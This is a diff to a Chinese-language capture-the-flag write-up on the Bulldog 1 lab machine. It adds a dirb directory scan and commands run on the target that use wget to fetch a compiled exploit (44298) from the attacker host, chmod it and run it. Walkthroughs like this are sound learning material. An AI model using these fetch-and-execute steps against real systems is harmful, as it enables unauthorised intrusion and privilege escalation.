@@ -85,7 +85,7 @@ nmap -T 5 -A 192.168.248.165
 老规矩先扫描 `web` 站点的目录
 
 ```sh
-
+dirb http://192.168.248.165 -r
 ```
 
 ![Bulldog_1_4](/image/2019-05-05-Bulldog1_writeup/Bulldog_1_4.png)
@@ -219,7 +219,9 @@ gcc --static 44298.c -o 44298
 靶机：
 
 ```sh
-
+wget https://192.168.248.164/44298
+chmod 777 44298
+./44298
 ```
 
 ![Bulldog_1_10](/image/2019-05-05-Bulldog1_writeup/Bulldog_1_10.png)
